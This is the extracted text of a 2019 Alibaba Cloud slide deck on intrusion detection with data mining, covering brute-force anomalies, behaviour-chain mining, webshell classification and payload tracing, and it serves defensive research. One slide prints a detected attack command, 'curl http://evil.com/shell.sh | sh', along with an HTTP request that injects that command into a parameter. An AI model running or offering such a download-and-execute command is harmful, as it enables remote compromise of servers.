数据挖掘赋能安全感知：
阿里云大数据入侵检测实践
Han Zheng
资深安全工程师
2019年5月29日
Yue Xu
安全工程师
团队成员
任职于阿里巴巴云安全中心，负责算法实现和入侵检测与威胁情
报的研发团队。
Han Zheng、Yue Xu、Wei He
云 + 安全性
优势
•
数据计算能力
•
丰富的安全日志
•
从上帝视角来看数据
挑战
•
庞大的业务环境
•
从“脚本小子”到国家，多方遇敌
•
精确率和召回率都让人担忧
数据流
威胁建模案例表
•
暴力攻击
•
恶意行为链
•
恶意 Web 脚本（即 Webshell）
•
攻击载荷回溯
威胁建模案例表
•
暴力攻击
•
恶意行为链
•
恶意 Web 脚本（即 Webshell）
•
攻击载荷回溯
基于规则的决策所存在的问题
服务器登录事件的特征
•
基于规则的决策 难以在假正率（False 
Positive）和真负率（True Negative）
之间取得平衡。
•
不同服务器有着 不同的行为。并非所有
情况都能事先了解。
多元高斯模型
查找异常行为
高斯分布
威胁建模案例表
•
暴力攻击
•
恶意行为链
•
恶意 Web 脚本（即 Webshell）
•
攻击载荷回溯
恶意行为链
模式挖掘
流程、文件和网络的链接
生成强关联规则
DDG 挖掘命令
匹配到的模式
威胁建模案例表
•
暴力攻击
•
恶意行为链
•
恶意 Web 脚本（即 Webshell）
•
攻击载荷回溯
恶意 Web 脚本
两类恶意 PHP 脚本（Webshell）
特征
01 文本
03 动态函数调用
02 opcode
机器学习性能
每日遭感染主机数（2 - 4 月）
机器学习技
术的改进
基于规则
的结果
实验室性能：
针对 30,000 个样本进行测试
实现了：F1=98.78%, 
AUC=99.97%
上线后性能：
检测率提高 17%，3 个月内仅一次假阳性
警报。
威胁建模案例表
•
暴力攻击
•
恶意行为链
•
恶意 Web 脚本（即 Webshell）
•
攻击载荷回溯
自动化攻击回溯
发现恶意进程：
curl http://evil.com/shell.sh | sh
如何被入侵的？
攻击者的 HTTP 请求为：
POST /XXX/XXXX HTTP/1.1
Host: xxx.xx.xxx:7001
cmd=curl http://evil.com/shell.sh
| sh&XXXXXXXXXX
文本相似性分析
问题：
如果攻击者的载荷
被编码/加密呢？
编码后载荷回溯
解决了：
在不具备文本特征，且对弱点不了解情
况下进行载荷回溯的能力
仅适用于：
一对多攻击
编码后载荷回溯案例
发现：Webshell 连接流
（载荷使用 base64 编码）
编码后载荷回溯案例
发现：Java 反序列化利用
（载荷通过 Java 序列化 编码）
编码后载荷回溯案例
发现：SQL 注入导致的 RCE
（RCE 载荷隐藏在一个 特殊的六进制字符串 中）
借助数据挖掘增强安全感知能力
•
标签数据的缺乏 和不明确的 威胁边界 限制了机器学习在安全领域的
表现。
•
面对网络威胁，AI 并非“万灵药”。更重要的是确定 何时需要 AI，
以及如何对效果进行量化。
•
没有免费的午餐，您必须根据具体项目的 实际情况 选择最适合的算
法。
云 + 安全性
优势和挑战
威胁建模案例
•
暴力攻击
•
异常进程启动
•
恶意 Web 脚本（即 Webshell）
•
攻击载荷回溯
问答
Enhance Security Awareness with Data Mining 
Han Zheng 
PI:EMAIL 
Yue Xu 
PI:EMAIL 
郑瀚Andrew_Hann
cdxy000
cdxy_
数据挖掘赋能安全感知：阿里云大数据入侵检测实践